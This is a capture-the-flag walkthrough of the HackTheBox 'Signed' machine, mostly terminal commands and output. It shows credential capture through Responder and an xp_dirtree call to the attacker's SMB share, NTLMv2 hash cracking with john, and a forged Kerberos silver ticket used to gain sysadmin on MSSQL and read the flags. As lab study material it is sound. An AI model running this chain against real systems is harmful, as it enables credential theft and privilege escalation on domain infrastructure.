# **Signed - HackTheBox**

*Target Ip. Address : 10.129.242.173*

In this challenge, we are given the credentials.

```credentials
Username: scott
Password: Sm230#C5NatH
```

So, let's start with nmap scan.

```bash
kali@kali:nmap -sV -sC 10.129.242.173
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-06 12:12 +0545
Nmap scan report for 10.129.242.173 (10.129.242.173)
Host is up (0.32s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT     STATE SERVICE  VERSION
1433/tcp open  ms-sql-s Microsoft SQL Server 2022 16.00.1000.00; RTM
| ms-sql-info: 
|   10.129.242.173:1433: 
|     Version: 
|       name: Microsoft SQL Server 2022 RTM
|       number: 16.00.1000.00
|       Product: Microsoft SQL Server 2022
|       Service pack level: RTM
|       Post-SP patches applied: false
| _    TCP port: 1433
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2026-02-06T06:26:53
| _Not valid after:  2056-02-06T06:26:53
| _ssl-date: 2026-02-06T06:27:59+00:00; +1s from scanner time.
| ms-sql-ntlm-info: 
|   10.129.242.173:1433:
|     Target _Name: SIGNED
|     NetBIOS _Domain _Name: SIGNED
|     NetBIOS _Computer _Name: DC01
|     DNS _Domain _Name: SIGNED.HTB
|     DNS _Computer _Name: DC01.SIGNED.HTB
|     DNS _Tree _Name: SIGNED.HTB0
| _    Product _Version: 10.0.17763
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 56.75 seconds
```

We have just mssql port open. Let's add the Domain and Computer name on our hosts file.

```bash
kali@kali:cat /etc/hosts
10.129.242.173  SIGNED.HTB DC01.SIGNED.HTB

127.0.0.1       localhost
127.0.1.1       kali.kali       kali

 # The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

Since, we have MSSQL credentials, let's login.

```bash
kali@kali:impacket-mssqlclient scott:Sm230#C5NatH@10.129.242.173
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

 [*] Encryption required, switching to TLS
 [*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
 [*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us _english
 [*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
 [*] INFO(DC01): Line 1: Changed database context to 'master'.
 [*] INFO(DC01): Line 1: Changed language setting to us _english.
 [*] ACK: Result: 1 - Microsoft SQL Server 2022 RTM (16.0.100)
 [!] Press help for extra shell commands
SQL (scott guest@master)> 
```

There is nothing more we can do as user scott. Let's set up responder to see if we can capture NTLM hash.

```bash
kali@kali:sudo responder -I tun0
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

 [*] Sponsor this project:  [USDT: TNS8ZhdkeiMCT6BpXnj4qPfWo3HpoACJwv] ,  [BTC: 15X984Qco6bUxaxiR8AmTnQQ5v1LJ2zpNo]
 [+] Poisoners:
    LLMNR                       [ON]
    NBT-NS                      [ON]
    MDNS                        [ON]
    DNS                         [ON]
    DHCP                        [OFF]
    DHCPv6                      [OFF]
.
.
.
.
 [*] Version: Responder 3.2.0.0
 [*] Author: Laurent Gaffie, <lgaffie@secorizon.com>

 [+] Listening for events... 
```

On, mssqlclient run this command to get a NTLM hash.

```bash
SQL (scott  guest@master)> exec xp_dirtree '//10.10.16.26/share'
subdirectory   depth   
------------   -----   
SQL (scott  guest@master)> 
```

You should get a hash dropped in the responder.

```bash
 [+] Listening for events...                                                                                                            
 [SMB] NTLMv2-SSP Client   : 10.129.242.173
 [SMB] NTLMv2-SSP Username : SIGNED  mssqlsvc
 [SMB] NTLMv2-SSP Hash     : mssqlsvc::SIGNED:79b8095e80f77.....00300000  
```

We get a NTLM hash of mssqlsvc. Let's crack it using john the ripper.

```bash
kali@kali:john hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R  [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
pu...!@     (mssqlsvc)     
1g 0:00:00:02 DONE (2026-02-06 12:28) 0.4878g/s 2188Kp/s 2188Kc/s 2188KC/s purcitititya..puppuh
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed.
```

We successfully cracked the hash for mssqlsvc. Let's login into MSSQL.

```bash
kali@kali:impacket-mssqlclient mssqlsvc:'pu...!@'@10.129.242.173 -windows-auth                                                          
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

 [*] Encryption required, switching to TLS
 [*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
 [*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us _english
 [*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
 [*] INFO(DC01): Line 1: Changed database context to 'master'.
 [*] INFO(DC01): Line 1: Changed language setting to us _english.
 [*] ACK: Result: 1 - Microsoft SQL Server 2022 RTM (16.0.1000)
 [!] Press help for extra shell command
```

Let's check if we have sys _admin rights.

```bash
SQL (SIGNED  mssqlsvc  guest@master)> SELECT IS_SRVROLEMEMBER('sysadmin');
 -   
0   
SQL (SIGNED  mssqlsvc  guest@master)> 
```

Unfortunately, we have no sys_admin rights, but we can use method called "Silver Ticket" where we can forge Kerberos Ticket Granting Service (TGS) ticket.

Get the SID of user IT.

```bash
SQL (SIGNED  mssqlsvc  guest@master)> SELECT SUSER_SID('SIGNED\IT');

-----------------------------------------------------------   
b'0105000000000005150000005b7bb0f398aa2245ad4a1ca451040000' 
```

Here are the findings from this. You can use ChatGPT to decode this.

```findings
IT_RID=1105
MSSQLSVC_RID=1103
DOMSID='S-1-5-21-4088429403-1159899800-2753317549'
```

Now, convert mssqlsvc password to ntlm hash.

```bash
kali@kali:echo -n 'pu...!@' | iconv -f UTF-8 -t UTF-16LE | openssl md4
MD4(stdin)= ef.....cc
```

Export all those findings for easy use and make the next command cleaner.

```bash
kali@kali:export NTHASH=ef.....cc                                                                                     
export DOMSID="S-1-5-21-4088429403-1159899800-2753317549"
export IT_RID=1105
export MSSQLSVC_RID=1103
```

Now, we will use impacket-ticketer to generate the ticket as Administrator.

```bash
kali@kali:impacket-ticketer -nthash $NTHASH -domain-sid $DOMSID -domain SIGNED.HTB -spn MSSQLSvc/dc01.signed.htb -groups 512,$IT_RID -user-id $MSSQLSVC_RID Administrator
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

 [*] Creating basic skeleton ticket and PAC Infos
 [*] Customizing ticket for SIGNED.HTB/Administrator
 [*]     PAC _LOGON _INFO
 [*]     PAC _CLIENT _INFO _TYPE
 [*]     EncTicketPart
 [*]     EncTGSRepPart
 [*] Signing/Encrypting final ticket
 [*]     PAC _SERVER _CHECKSUM
 [*]     PAC _PRIVSVR _CHECKSUM
 [*]     EncTicketPart
 [*]     EncTGSRepPart
 [*] Saving ticket in Administrator.ccache
```

Set the environment variable to use the new ticket.

```bash
kali@kali:export KRB5CCNAME=Administrator.ccache                                                                                      
```

```bash
kali@kali:klist                                                                                                                              
Ticket cache: FILE:/home/kali/Administrator.ccache
Default principal: Administrator@SIGNED.HTB

Valid starting       Expires              Service principal
02/06/2026 12:49:15  02/04/2036 12:49:15  MSSQLSvc/dc01.signed.htb@SIGNED.HTB
        renew until 02/04/2036 12:49:15
```

Now, we can login as Administrator using that hash.

```bash
kali@kali:impacket-mssqlclient -k -no-pass SIGNED.HTB/Administrator@dc01.signed.htb                                                          
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

 [*] Encryption required, switching to TLS
 [*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
 [*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us _english
 [*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
 [*] INFO(DC01): Line 1: Changed database context to 'master'.
 [*] INFO(DC01): Line 1: Changed language setting to us _english.
 [*] ACK: Result: 1 - Microsoft SQL Server 2022 RTM (16.0.1000)
 [!] Press help for extra shell commands
SQL (SIGNED  mssqlsvc  dbo@master)> 
```

Let's check if we are sys _admin.

```bash
SQL (SIGNED  mssqlsvc  dbo@master)> SELECT IS_SRVROLEMEMBER('sysadmin');
 -   
1   
SQL (SIGNED  mssqlsvc  dbo@master)> 
```

We are now sys _admin. Time to read the flags or you can also spawn a reverse shell with xp_cmdshell.

For the first flag, user.txt we use:

```bash
SQL (SIGNED  mssqlsvc  dbo@master)> SELECT  * FROM OPENROWSET(BULK 'C:  Users  mssqlsvc  Desktop  user.txt', SINGLE_CLOB) AS t;
BulkColumn                                
--------------------------------------   
b'e3.....85  r  n' 
```

For the final flag, root.txt and wrap this challenge we use:

```bash
SQL (SIGNED  mssqlsvc  dbo@master)> SELECT  * FROM OPENROWSET(BULK 'C:  Users  Administrator  Desktop  root.txt', SINGLE_CLOB) AS t;
BulkColumn                                
---------------------------------------   
b'c5.....3c  r  n'
```
